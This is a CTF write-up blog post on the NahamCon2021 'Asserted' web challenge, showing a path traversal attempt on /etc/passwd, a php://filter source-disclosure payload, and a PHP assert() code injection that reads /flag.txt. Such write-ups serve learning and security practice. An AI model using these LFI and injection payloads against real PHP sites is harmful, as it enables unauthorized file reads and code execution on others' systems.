---
title: "NahamCon2021 CTF - Asserted"
date: 2021-03-15T11:52:39+02:00
categories:
- writeup
- ctf
- nahamcon
- nahamcon2021
- 2021
---

## category

web - medium

## solution

The challenge URL dropped us on a page related to fitness, with not a lot of interesting interactions.

{{< figure src="/images/nahamcon/asserted.png" >}}

Navigating the pages you'd see a URL scheme where a `page` parameter is set. Eg: `page=about`. An `about.php` also exists, so this was potentially vuln to LFI. Using `..` in the `page` parameter resulted in a warning message indicating that some filtering was taking place.

```bash
$ curl "http://challenge.nahamcon.com:31497/index.php?page=../../../../../../../etc/passwd"
HACKING DETECTED! PLEASE STOP THE HACKING PRETTY PLEASE
```

PHP has [stream wrappers](https://www.php.net/manual/en/wrappers.php), one we could use to [read files from the filesystem](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md#wrapper-phpfilter). E.g.: `php://filter/convert.base64-encode/resource=<file>`. Specifying a file path with a `..` it still triggered the security check, but, we could download the source of the `index.php` file.

```bash
$ curl "http://challenge.nahamcon.com:31497/index.php?page=php://filter/convert.base64-encode/resource=index"
PD9waHANCg0KaWYgKGlzc2V0KCRfR0VUWydwYWdlJ10pKSB7DQogICRwYWdlID0gJF9HRVRbJ3BhZ2UnXTsNCiAgJGZpbGUgPSAkcGFnZSAuICIucGhwIjsNCg0KICAvLyBTYXZpbmcgb3Vyc2VsdmVzIGZyb20gYW55IGtpbmQgb2YgaGFja2luZ3MgYW5kIGFsbA0KICBhc3NlcnQoInN0cnBvcygnJGZpbGUnLCAnLi4nKSA9PT0gZmFsc2UiKSBvciBkaWUoIkhBQ0tJTkcgREVURUNURUQhIFBMRUFTRSBTVE9QIFRIRSBIQUNLSU5HIFBSRVRUWSBQTEVBU0UiKTsNCiAgDQp9IGVsc2Ugew0KICAkZmlsZSA9ICJob21lLnBocCI7DQp9DQoNCmluY2x1ZGUoJGZpbGUpOw0KDQo/Pg0K
```

Decoding that reveals the check in place.

```php
<?php

if (isset($_GET['page'])) {
  $page = $_GET['page'];
  $file = $page . ".php";

  // Saving ourselves from any kind of hackings and all
  assert("strpos('$file', '..') === false") or die("HACKING DETECTED! PLEASE STOP THE HACKING PRETTY PLEASE");

} else {
  $file = "home.php";
}

include($file);

?>
```

Immediately you should see that an `assert()` is called with some PHP source code as a string. We can inject PHP source code here because we can taint the string passed to `assert()` as `$file` is from the request, and thus user controlled. 

Testing this locally was pretty easy. Before the `assert()` call I added a line to log what the string would look like first. I then served the script with `php -S localhost:1337`.

```php
// ...

$d = "strpos('$file', '..') === false";
error_log(print_r($d, TRUE));

// ...
```

Using this debug line I added code to the request to close the original `strpos()` call so that it would fail, and closed off the rest of the original `strpos()` so that it would fail as well.

{{< figure src="/images/nahamcon/asserted_code_inject.png" >}}

Passing `','foo') === false && strpos('1` as a `page` parameter value would result in the application saying that it could not find the file we wanted to include. Excellent! The challenge hint tells us that the flag is in `/flag.txt`, so to echo that I just added a `die(file_get_contents('/flag.txt'))`, exactly the same way the security check worked.

```text
$ curl -G "http://challenge.nahamcon.com:31497/" --data-urlencode "page=','foo') === false && die(file_get_contents('/flag.txt')) && strpos('1"
flag{85a25711fa6e111ed54b86468a45b90c}
```
